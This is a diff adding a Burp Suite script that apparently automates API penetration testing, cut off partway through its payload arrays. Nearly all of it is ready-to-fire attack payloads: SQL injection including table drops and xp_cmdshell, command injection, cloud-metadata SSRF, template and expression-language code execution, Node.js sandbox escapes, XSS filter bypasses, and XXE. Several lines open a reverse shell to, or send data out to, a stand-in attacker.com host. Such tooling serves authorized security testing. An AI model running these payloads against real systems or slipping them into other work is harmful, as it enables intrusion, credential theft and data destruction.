@@ -1,0 +1,3470 @@
+// Save as API-Testing-PT.bambda -> Repeater Tab -> Custom Action
+// *** ADVANCED & COMPREHENSIVE API SECURITY TESTING FRAMEWORK ***
+// Fully automated with 1000+ attack vectors organized for easy maintenance
+// All requests are sent directly without creating new tabs
+// Results available in Burp Organizer tab with detailed logging
+// Supports: JSON, XML, Raw Body, Form Data, URL Parameters, GraphQL
+// Authentication: Cookies, Header Tokens (Bearer, API Keys, JWT, OAuth, Basic)
+// ============================================================
+//
+// ┌─────────────────────────────────────────────────────────┐
+// │  PART 1: PARAMETER-BASED TESTS                          │
+// │  (Executed for EACH parameter found in the request)     │
+// └─────────────────────────────────────────────────────────┘
+//
+// Category 1: Input Fuzzing
+//   1a. Numeric Fuzzing
+//   1b. String Fuzzing
+//
+// Category 2: Injection Attacks
+//   2a. SQL Injection (Time-based, Boolean, Error-based, Union, Stacked)
+//   2b. OS Command Injection
+//   2c. LDAP Injection
+//   2d. XPath Injection
+//   2e. Code Injection (PHP, Python, JavaScript, Java)
+//   2f. SSRF (Server-Side Request Forgery + Blind SSRF)
+//   2g. SSTI (Server-Side Template Injection)
+//   2h. Expression Language Injection (SpEL, OGNL, MVEL, EL)
+//   2i. Server-Side JavaScript Injection (Node.js)
+//
+// Category 3: Authorization & Access Control
+//   3a. IDOR (Insecure Direct Object References + Advanced Enumeration)
+//
+// Category 4: Input Validation & Encoding
+//   4a. XSS (Cross-Site Scripting)
+//   4b. Parameter Pollution
+//   4c. JSON Injection
+//   4d. NoSQL Injection
+//   4e. XXE (XML External Entity)
+//   4f. Path Traversal / LFI to RCE
+//   4g. Deserialization Attacks
+//   4h. CRLF Injection
+//   4i. Mass Assignment
+//   4j. Prototype Pollution
+//   4k. File Upload Bypass
+//   4l. Business Logic
+//   4m. Unicode Normalization
+//   4n. HTML Injection
+//   4o. CSV Injection
+//   4p. SMTP Header Injection
+//
+// ┌─────────────────────────────────────────────────────────┐
+// │  PART 2: PER-REQUEST TESTS                              │
+// │  (Executed ONCE per request - headers/methods/global)   │
+// └─────────────────────────────────────────────────────────┘
+//
+// Category 5: Authentication & Session Management
+//   5a. Token Tampering
+//   5b. JWT Attacks (Algorithm Confusion, JKU/X5U)
+//   5c. Session Security
+//   5d. 2FA/MFA Bypass
+//   5e. OAuth/OIDC Attacks
+//
+// Category 6: Authorization & Privilege Escalation
+//   6a. Privilege Escalation Headers
+//
+// Category 7: HTTP Protocol & Methods
+//   7a. HTTP Method Testing
+//   7b. HTTP Verb Tampering
+//   7c. URL Manipulation
+//
+// Category 8: Content Type & Headers
+//   8a. Content-Type Bypass
+//   8b. CORS Misconfiguration (Advanced)
+//   8c. Host Header Injection
+//   8d. Cache Poisoning (Unkeyed Headers)
+//   8e. Log Injection / Log Forging
+//
+// Category 9: Security Headers & Configuration
+//   9a. Security Headers Analysis
+//   9b. Sensitive Data Exposure
+//   9c. Cookie Security
+//   9d. WebSocket Security
+//
+// Category 10: Advanced Attacks
+//   10a. GraphQL Testing
+//   10b. HTTP Request Smuggling
+//   10c. Race Conditions (TOCTOU)
+//
+// ============================================================
+// TOTAL: 50+ Vulnerability Categories | 1500+ Payloads
+// ============================================================
+
+// Delay variable, Adjust as per requirement - 1000 = 1 second delay
+int GLOBAL_DELAY_MS = 100;
+
+// ############################################################
+// ############################################################
+// ##                                                        ##
+// ##  PART 1: PARAMETER-BASED TEST PAYLOADS                 ##
+// ##  (These payloads are tested for EACH parameter)        ##
+// ##                                                        ##
+// ############################################################
+// ############################################################
+
+// ============================================================
+// CATEGORY 1: INPUT FUZZING
+// ============================================================
+
+// 1a. Numeric Fuzzing - Zero, negative, or very large numbers
+String[] NUMERIC_FUZZING_PAYLOADS = {
+    "0",
+    "-1",
+    "-999999999",
+    "999999999999999999999",
+    "0.0",
+    "-0.001",
+    "1e308",
+    "-1e308",
+    "NaN",
+    "Infinity",
+    "-Infinity",
+    "2147483648",
+    "-2147483649",
+    "9999999999999999999999999999",
+    "0x7FFFFFFF",
+    "0xFFFFFFFF"
+};
+
+// 1b. String Fuzzing - Special characters and patterns
+String[] STRING_FUZZING_PAYLOADS = {
+    "%23$%25^%26*()",
+    "<>\"'`",
+    "[]{}|\\",
+    "~`+=!@#$%",
+    ";:,./?",
+    "\\\\\\\\",
+    "(){}[]<>",
+    "\0\n\r\t",
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
+};
+
+// ============================================================
+// CATEGORY 2: INJECTION ATTACKS
+// ============================================================
+
+// 2a. SQL Injection (Advanced - Time-based, Boolean, Error-based, Union, Stacked)
+String[] SQLI_PAYLOADS = {
+    // Basic SQLi
+    "'+OR+'1'='1",
+    "'",
+    "\"",
+    "'+OR+1=1--",
+    "admin'--",
+    "'+OR+'a'='a",
+    "1'+OR+'1'='1'+/*",
+    "'--+-",
+    "'++OR+1=1--",
+    
+    // Union-based SQLi
+    "'++UNION++SELECT+NULL--",
+    "'++UNION++SELECT+NULL,NULL--",
+    "'++UNION++SELECT+NULL,NULL,NULL--",
+    "'++UNION+SELECT+username,password+FROM+users--",
+    "'+UNION+ALL+SELECT+NULL,NULL,NULL--",
+    "'+UNION+SELECT+@@version,NULL,NULL--",
+    
+    // Boolean-based Blind SQLi
+    "'++AND+1=1--",
+    "'++AND+1=2--",
+    "'+AND+'a'='a",
+    "'+AND+'a'='b",
+    "'+AND+SUBSTRING(@@version,1,1)='5'--",
+    "'+AND+ASCII(SUBSTRING((SELECT+database()),1,1))>96--",
+    
+    // Time-based Blind SQLi - MySQL
+    "'++SLEEP(5)--",
+    "'+AND+SLEEP(5)--",
+    "'+OR+SLEEP(5)--",
+    "1'+AND+SLEEP(5)+AND+'1'='1",
+    "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+    "'+OR+IF(1=1,SLEEP(5),0)--",
+    
+    // Time-based Blind SQLi - MSSQL
+    "'++WAITFOR+DELAY+'0:0:5'--",
+    "'+WAITFOR+DELAY+'00:00:05'--",
+    "';+WAITFOR+DELAY+'0:0:5';--",
+    "1';WAITFOR+DELAY+'0:0:5'--",
+    
+    // Time-based Blind SQLi - PostgreSQL
+    "'+AND+pg_sleep(5)--",
+    "';SELECT+pg_sleep(5)--",
+    
+    // Time-based Blind SQLi - Oracle
+    "'+AND+DBMS_LOCK.SLEEP(5)--",
+    "';BEGIN+DBMS_LOCK.SLEEP(5);+END;--",
+    
+    // Error-based SQLi
+    "'+AND+extractvalue(1,concat(0x7e,(SELECT+@@version),0x7e))--",
+    "'+AND+updatexml(1,concat(0x7e,database()),1)--",
+    "'+AND+1=convert(int,(SELECT+@@version))--",
+    "'+AND+1=CAST(@@version+AS+int)--",
+    "'+UNION+SELECT+NULL,NULL+WHERE+1=@@version--",
+    
+    // Stacked Queries
+    "';+DROP+TABLE+users--",
+    "1;+SELECT+*+FROM+information_schema.tables--",
+    "';+EXEC+xp_cmdshell('whoami')--",
+    "';+CREATE+TABLE+test(id+int)--",
+    
+    // Database-specific - MySQL
+    "'+UNION+SELECT+NULL,concat(user,0x3a,password)+FROM+mysql.user--",
+    "'+AND+ROW(1,1)>(SELECT+COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)--",
+    
+    // Database-specific - MSSQL
+    "'+UNION+SELECT+NULL,name+FROM+master..sysdatabases--",
+    "'+UNION+SELECT+NULL,@@servername,@@version--",
+    "';+EXEC+master..xp_cmdshell+'ping+127.0.0.1'--",
+    
+    // Database-specific - PostgreSQL
+    "'+UNION+SELECT+NULL,version()--",
+    "'+UNION+SELECT+NULL,current_database()--",
+    
+    // Database-specific - Oracle
+    "'+UNION+SELECT+NULL,banner+FROM+v$version--",
+    "'+UNION+SELECT+NULL,table_name+FROM+all_tables--",
+    
+    // NoSQL-style in SQL context
+    "'||'1'='1",
+    "'||DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)||'",
+    
+    // Polyglot SQLi
+    "SLEEP(5)/*'+or+'1'='1'/**/--+-",
+    "1')||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||('"
+};
+
+// 2b. OS Command Injection
+String[] OS_COMMAND_PAYLOADS = {
+    // Basic command injection
+    ";+ls+-la",
+    "|+whoami",
+    "%26%26+dir",
+    "`id`",
+    "$(whoami)",
+    ";+cat+/etc/passwd",
+    "%26%26+echo+vulnerable",
+    ";+ping+-c+1+127.0.0.1",
+    "|+type+C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "$(ping+-c+1+127.0.0.1)",
+    "|+ls",
+    ";+id",
+    "|+nc+-e+/bin/sh+attacker.com+4444",
+    "|+powershell+whoami",
+    "|+curl+http://attacker.com",
+    "`cat+/etc/shadow`",
+    "||+whoami",
+    "%0a+id",
+    "$IFS",
+    ";+uname+-a",
+    
+    // Advanced command injection with encoding
+    ";$IFS$9ls$IFS$9-la",
+    "|${IFS}whoami",
+    ";%0als%0a-la",
+    "%0a%0did%0a%0d",
+    ";{cat,/etc/passwd}",
+    "|{ls,-la}",
+    "`echo${IFS}vulnerable`",
+    "$(echo${IFS}vulnerable)",
+    
+    // Time-based command injection
+    "|+sleep+5",
+    ";+sleep+5",
+    "`sleep+5`",
+    "$(sleep+5)",
+    "|+timeout+/t+5",
+    ";+ping+-c+5+127.0.0.1",
+    
+    // Blind command injection
+    "|+nslookup+attacker.com",
+    ";+curl+http://attacker.com/$(whoami)",
+    "|+wget+http://attacker.com/?data=$(id)",
+    ";+ping+-c+1+`whoami`.attacker.com",
+    
+    // Polyglot command injection
+    "';id;'",
+    "\";whoami;\"",
+    "'`id`'",
+    "';{cat,/etc/passwd};'"
+};
+
+// 2f. SSRF (Server-Side Request Forgery)
+String[] SSRF_PAYLOADS = {
+    // Cloud Metadata endpoints - AWS
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data/",
+    "http://169.254.169.254/latest/dynamic/instance-identity/",
+    
+    // Cloud Metadata endpoints - GCP
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://metadata/computeMetadata/v1/",
+    
+    // Cloud Metadata endpoints - Azure
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/identity/oauth2/token",
+    
+    // Cloud Metadata endpoints - Digital Ocean
+    "http://169.254.169.254/metadata/v1/",
+    "http://169.254.169.254/metadata/v1.json",
+    
+    // Local network scanning
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://0.0.0.0",
+    "http://[::1]",
+    "http://127.1",
+    "http://127.0.1",
+    "http://2130706433",
+    
+    // Internal IP ranges
+    "http://192.168.0.1",
+    "http://192.168.1.1",
+    "http://10.0.0.1",
+    "http://172.16.0.1",
+    
+    // File protocol
+    "file:///etc/passwd",
+    "file:///c:/windows/win.ini",
+    "file://localhost/etc/passwd",
+    
+    // Protocol smuggling
+    "dict://127.0.0.1:11211/stat",
+    "gopher://127.0.0.1:6379/_INFO",
+    "ldap://127.0.0.1:389",
+    "tftp://127.0.0.1:69/file",
+    
+    // URL bypass techniques
+    "http://①②⑦.⓪.⓪.①",
+    "http://127。0。0。1",
+    "http://localhost@169.254.169.254",
+    "http://169.254.169.254#@google.com",
+    "http://google.com#@169.254.169.254",
+    "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "http://0x7f.0x0.0x0.0x1",
+    "http://0177.0.0.1",
+    
+    // DNS rebinding
+    "http://spoofed.burpcollaborator.net",
+    "http://127.0.0.1.nip.io",
+    "http://127.0.0.1.xip.io",
+    
+    // Common internal services
+    "http://localhost:80",
+    "http://localhost:8080",
+    "http://localhost:3000",
+    "http://localhost:5000",
+    "http://localhost:6379",
+    "http://localhost:11211",
+    "http://localhost:27017",
+    
+    // Blind SSRF Detection - DNS Callbacks (replace with your Burp Collaborator or DNS logger)
+    "http://ssrf-test.burpcollaborator.net",
+    "http://ssrf-${RANDOM}.burpcollaborator.net",
+    "http://unique-identifier.oastify.com",
+    "http://canary-token.burpcollaborator.net",
+    
+    // Blind SSRF - HTTP Callbacks
+    "http://webhook.site/unique-id",
+    "http://requestbin.net/r/unique-id",
+    
+    // Blind SSRF via redirects
+    "http://attacker.com/redirect-to-internal",
+    
+    // Blind SSRF - Time-based detection
+    "http://127.0.0.1:22",  // SSH timeout
+    "http://127.0.0.1:3389",  // RDP timeout
+    
+    // SSRF with authentication bypass
+    "http://user:pass@127.0.0.1",
+    "http://admin:admin@localhost",
+    
+    // SSRF via URL schemes
+    "jar:http://attacker.com!/",
+    "jar:file:///etc/passwd!/",
+    "netdoc:///etc/passwd",
+    "ssh://user@127.0.0.1",
+    "ftp://127.0.0.1",
+    
+    // Cloud-specific bypasses
+    "http://[::ffff:169.254.169.254]",
+    "http://425.510.425.510",  // Decimal bypass for 169.254.169.254
+    
+    // SSRF via Open Redirect
+    "http://legitimate-site.com/redirect?url=http://169.254.169.254",
+    
+    // DNS rebinding enhanced
+    "http://A.B.C.D.1time.169.254.169.254.1time.repeat.rebind.network",
+    
+    // SSRF with data exfiltration
+    "http://attacker.com/?data=file:///etc/passwd"
+};
+
+// 2c. LDAP Injection
+String[] LDAP_INJECTION_PAYLOADS = {
+    "*",
+    "*)(%26",
+    "*))%00",
+    ")(cn=*",
+    "*)(uid=*",
+    "admin)(%26(password%3d*))",
+    "*()|%26'",
+    "*%29%28%7C%28objectClass%3D*",
+    "*%29%28uid%3D*",
+    "*%29%28mail%3D*",
+    "*%29%28password%3D*",
+    "*)(&(objectclass=*)",
+    "admin)(|(password=*))",
+    "x'))(|(uid=*))"
+};
+
+// 2d. XPath Injection
+String[] XPATH_INJECTION_PAYLOADS = {
+    "'+or+'1'='1",
+    "'+or+''='",
+    "x'+or+1=1+or+'x'='y",
+    "admin'+or+'1'='1",
+    "//*",
+    "'+or+name()='username'+or+'a'='a",
+    "'+or+1=1+or+''='",
+    "1+or+1=1",
+    "'+or+string-length(name(/*[1]))>0+or+'a'='a",
+    "'+or+substring(name(/*[1]),1,1)='a'+or+'a'='a",
+    "'+and+count(/*)=1+and+'a'='a",
+    "admin']/parent::*/child::node()%00"
+};
+
+// 2e. Code Injection (PHP, Python, JavaScript, Java)
+String[] CODE_INJECTION_PAYLOADS = {
+    "<?php+phpinfo();+?>",
+    "<?php+system('id');+?>",
+    "${7*7}",
+    "{{7*7}}",
+    "#{7*7}",
+    "<%=7*7%>",
+    "__import__('os').system('id')",
+    "eval('7*7')",
+    "exec('whoami')",
+    "${jndi:ldap://attacker.com/a}",
+    "{{constructor.constructor('return+this')().process.mainModule.require('child_process').execSync('id')}}",
+    "require('child_process').exec('id')",
+    "java.lang.Runtime.getRuntime().exec('id')",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}"
+};
+
+// 2g. SSTI (Server-Side Template Injection)
+String[] SSTI_PAYLOADS = {
+    // Jinja2 (Python)
+    "{{7*7}}",
+    "{{7*'7'}}",
+    "{{config}}",
+    "{{config.items()}}",
+    "{{self}}",
+    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    
+    // Twig (PHP)
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+    "{{['id']|filter('system')}}",
+    "{{['id','ls']|map('system')|join}}",
+    
+    // Freemarker (Java)
+    "<#assign+ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(',')}",
+    
+    // Velocity (Java)
+    "#set($str=$class.inspect('java.lang.Runtime').type)",
+    "#set($ex=$str.getRuntime().exec('id'))",
+    
+    // Thymeleaf (Java)
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "__${T(java.lang.Runtime).getRuntime().exec('calc')}__::.x",
+    
+    // Smarty (PHP)
+    "{system('id')}",
+    "{php}echo+`id`;{/php}",
+    
+    // Pug/Jade (Node.js)
+    "#{7*7}",
+    "#{global.process.mainModule.require('child_process').execSync('id').toString()}",
+    
+    // ERB (Ruby)
+    "<%=7*7%>",
+    "<%=`id`%>",
+    "<%=system('id')%>",
+    "<%= File.open('/etc/passwd').read %>",
+    
+    // Tornado (Python)
+    "{% import os %}{{os.popen('id').read()}}",
+    
+    // EJS (Node.js)
+    "<%=7*7%>",
+    "<%=global.process.mainModule.require('child_process').execSync('id').toString()%>"
+};
+
+// 2h. Expression Language Injection (SpEL, OGNL, MVEL, EL)
+String[] EXPRESSION_LANGUAGE_PAYLOADS = {
+    // Spring Expression Language (SpEL)
+    "${7*7}",
+    "#{7*7}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
+    "T(java.lang.Runtime).getRuntime().exec('calc')",
+    "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
+    
+    // OGNL (Object-Graph Navigation Language)
+    "${@java.lang.Runtime@getRuntime().exec('id')}",
+    "${#context['xwork.MethodAccessor.denyMethodExecution']=false}",
+    "${@java.lang.System@exit(0)}",
+    
+    // MVEL (MVFLEX Expression Language)
+    "Runtime.getRuntime().exec('id');",
+    
+    // Unified EL (Expression Language)
+    "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}"
+};
+
+// 2i. Server-Side JavaScript Injection (SSJI) - Node.js
+String[] SSJI_PAYLOADS = {
+    // Basic Node.js injection
+    "require('child_process').exec('id')",
+    "require('child_process').execSync('id').toString()",
+    "global.process.mainModule.require('child_process').execSync('id').toString()",
+    "process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:'pipe'}).output",
+    
+    // VM escape
+    "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()",
+    "({}).constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()",
+    
+    // require() manipulation
+    "require('fs').readFileSync('/etc/passwd','utf8')",
+    "require('fs').readdirSync('/')",
+    "require('os').userInfo()",
+    "require('os').hostname()",
+    
+    // process object abuse
+    "process.env",
+    "process.cwd()",
+    "process.mainModule",
+    "process.platform",
+    "process.version",
+    
+    // Buffer manipulation
+    "Buffer.from('test').toString('base64')",
+    
+    // Advanced VM escape techniques
+    "global.process.mainModule.constructor._load('child_process').execSync('id').toString()",
+    "this.constructor.constructor('return this')().require('child_process').execSync('id')",
+    
+    // Async exploitation
+    "setTimeout(function(){require('child_process').exec('id')},0)",
+    "setImmediate(function(){require('child_process').exec('id')})",
+    
+    // Module cache manipulation
+    "delete require.cache[require.resolve('module')];require('child_process').exec('id')",
+    
+    // Prototype pollution to RCE
+    "constructor[prototype][execSync]=require('child_process').execSync;constructor.execSync('id')"
+};
+
+// ============================================================
+// CATEGORY 3: AUTHORIZATION & ACCESS CONTROL
+// ============================================================
+
+// 3a. IDOR (Insecure Direct Object References + Advanced Enumeration)
+String[] IDOR_PAYLOADS = {
+    // Basic numeric IDs
+    "1",
+    "0",
+    "2",
+    "-1",
+    "100",
+    "999",
+    "9999",
+    "99999",
+    
+    // String IDs
+    "admin",
+    "user",
+    "test",
+    "guest",
+    "root",
+    "administrator",
+    
+    // UUIDs
+    "00000000-0000-0000-0000-000000000000",
+    "11111111-1111-1111-1111-111111111111",
+    "ffffffff-ffff-ffff-ffff-ffffffffffff",
+    
+    // UUID v1 enumeration (timestamp-based - can predict/enumerate)
+    "00000000-0000-1000-8000-000000000000",
+    "ffffffff-ffff-1fff-bfff-ffffffffffff",
+    
+    // Sequential ID patterns
+    "../1",
+    "..%2f1",
+    "1%00",
+    "1%0a2",
+    
+    // Base64 encoded IDs (decode, increment, re-encode)
+    "MQ==",  // 1 in base64
+    "Mg==",  // 2 in base64
+    "YWRtaW4=",  // admin in base64
+    
+    // Hash-like IDs (MD5/SHA patterns)
+    "098f6bcd4621d373cade4e832627b4f6",  // Common MD5 hash
+    "5d41402abc4b2a76b9719d911017c592",  // Another test MD5
+    
+    // Hex encoded sequential
+    "0x1",
+    "0x2",
+    "0xA",
+    "0xFF",
+    
+    // Negative and boundary values
+    "-2147483648",  // INT_MIN
+    "2147483647",   // INT_MAX
+    "4294967295",   // UINT_MAX
+    
+    // Array/Object traversal
+    "users[0]",
+    "users[1]",
+    "../users/1",
+    
+    // Wildcard attempts
+    "*",
+    "%",
+    ".*",
+    
+    // Email-based IDs
+    "admin@localhost",
+    "test@example.com",
+    
+    // MongoDB ObjectId manipulation
+    "000000000000000000000000",
+    "111111111111111111111111",
+    "507f1f77bcf86cd799439011"  // Example ObjectId
+};
+
+// ============================================================
+// CATEGORY 4: INPUT VALIDATION & ENCODING
+// ============================================================
+
+// 4a. XSS (Cross-Site Scripting)
+String[] XSS_PAYLOADS = {
+    // Basic XSS
+    "<script>alert('XSS')</script>",
+    "<img+src=x+onerror=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<svg+onload=alert('XSS')>",
+    "'-alert('XSS')-'",
+    "\"><script>alert('XSS')</script>",
+    "<iframe+src=javascript:alert('XSS')></iframe>",
+    "<body+onload=alert('XSS')>",
+    "<details/open+ontoggle=alert('XSS')>",
+    "<input+onfocus=alert('XSS')+autofocus>",
+    
+    // Polyglot XSS
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>",
+    "'\"--></style></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//>'>",
+    
+    // DOM-based XSS
+    "#<img+src=x+onerror=alert(1)>",
+    "javascript:eval('ale'+'rt(1)')",
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    
+    // Mutation XSS (mXSS)
+    "<noscript><p+title=\"</noscript><img+src=x+onerror=alert(1)>\">",
+    "<listing>&lt;img+src=1+onerror=alert(1)&gt;</listing>",
+    "<svg><style><img+src=x+onerror=alert(1)></style></svg>",
+    
+    // WAF Bypass - Encoding
+    "<img+src=x+onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
+    "<img+src=x+oneRRor=alert(1)>",
+    "<ImG+SrC=x+OnErRoR=alert(1)>",
+    "<img/src=x/onerror=alert(1)>",
+    "<img%09src=x%09onerror=alert(1)>",
+    "<img%0Asrc=x%0Aonerror=alert(1)>",
+    "<img%0Dsrc=x%0Donerror=alert(1)>",
+    
+    // WAF Bypass - Obfuscation
+    "<svg><script>alert&#40;1&#41;</script></svg>",
+    "<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;1&#41;</script></svg>",
+    "<img+src=x+onerror=eval(atob('YWxlcnQoMSk='))>",
+    "<img+src=x+onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    
+    // Event handlers
+    "<body+onpageshow=alert(1)>",
+    "<body+onbeforeunload=alert(1)>",
+    "<marquee+onstart=alert(1)>",
+    "<select+onfocus=alert(1)+autofocus>",
+    "<textarea+onfocus=alert(1)+autofocus>",
+    "<keygen+onfocus=alert(1)+autofocus>",
+    "<video+src=x+onerror=alert(1)>",
+    "<audio+src=x+onerror=alert(1)>",
+    
+    // Template literals and expression injection
+    "{{constructor.constructor('alert(1)')()}}",
+    "${alert(1)}",
+    "{{7*7}}",
+    
+    // AngularJS
+    "{{$on.constructor('alert(1)')()}}",
+    "<div+ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+    
+    // VueJS
+    "{{_c.constructor('alert(1)')()}}",
+    
+    // Advanced bypass
+    "<iframe+srcdoc=\"<script>alert(1)</script>\">",
+    "<object+data=\"javascript:alert(1)\">",
+    "<embed+src=\"javascript:alert(1)\">",
+    "<form+action=\"javascript:alert(1)\"><input+type=submit>",
+    
+    // SVG-based
+    "<svg><animate+onbegin=alert(1)+attributeName=x></svg>",
+    "<svg><a+xlink:href=\"javascript:alert(1)\"><text+x=\"20\"+y=\"20\">XSS</text></a></svg>",
+    "<svg><set+onbegin=alert(1)+attributeName=x></svg>",
+    
+    // Filter bypass
+    "<<script>alert(1);//<</script>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "</script><script>alert(1)</script>",
+    
+    // Context-specific
+    "'-alert(1)-'",
+    "\"-alert(1)-\"",
+    "javascript:alert(1)//",
+    "';alert(1)//",
+    "\";alert(1)//"
+};
+
+// Content-Type Bypass Headers
+String[] CONTENT_TYPE_BYPASS = {
+    "application/json",
+    "application/xml",
+    "text/xml",
+    "application/x-www-form-urlencoded",
+    "multipart/form-data",
+    "text/plain",
+    "text/html",
+    "application/javascript",
+    "*/*",
+    "application/json;+charset=UTF-8",
+    "application/xml;+charset=UTF-8"
+};
+
+// 4b. Parameter Pollution
+String[] PARAMETER_POLLUTION_PAYLOADS = {
+    "&admin=true",
+    "&role=admin",
+    "&id=1&id=2",
+    "&debug=true",
+    "&test=1",
+    "&user=admin",
+    "&isAdmin=true",
+    "&verified=true",
+    "&access=full",
+    "&permission=all"
+};
+
+// 4e. XXE (XML External Entity)
+String[] XXE_PAYLOADS = {
+    // Basic XXE
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/windows/win.ini\">]>",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;]>",
+    "<!ENTITY+xxe+SYSTEM+\"expect://id\">",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"http://169.254.169.254/latest/meta-data/\">]>",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+data+[<!ENTITY+file+SYSTEM+\"file:///etc/hostname\">]><data>&file;</data>",
+    
+    // Blind XXE - OOB (Out-of-Band)
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/xxe\">+%xxe;]>",
+    "<!DOCTYPE+foo+[<!ENTITY+%+file+SYSTEM+\"file:///etc/passwd\"><!ENTITY+%+eval+\"<!ENTITY+%26%23x25;+exfil+SYSTEM+'http://attacker.com/?x=%file;'>\">%eval;%exfil;]>",
+    
+    // XXE via Parameter Entities
+    "<!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;%param1;]>",
+    
+    // XXE via SOAP
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><soap:Envelope+xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&xxe;</soap:Body></soap:Envelope>",
+    
+    // XXE via SVG upload
+    "<?xml+version=\"1.0\"?><!DOCTYPE+svg+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><svg>&xxe;</svg>",
+    
+    // XXE via Office Documents
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    
+    // XML Bomb (Billion Laughs Attack)
+    "<?xml+version=\"1.0\"?><!DOCTYPE+lolz+[<!ENTITY+lol+\"lol\"><!ENTITY+lol2+\"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY+lol3+\"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY+lol4+\"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY+lol5+\"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY+lol6+\"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY+lol7+\"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY+lol8+\"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY+lol9+\"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
+    
+    // Quadratic Blowup Attack
+    "<?xml+version=\"1.0\"?><foo>AAAAA...AAAAA</foo>",
+    
+    // XXE via XInclude
+    "<foo+xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include+parse=\"text\"+href=\"file:///etc/passwd\"/></foo>",
+    
+    // XXE via UTF-7 encoding
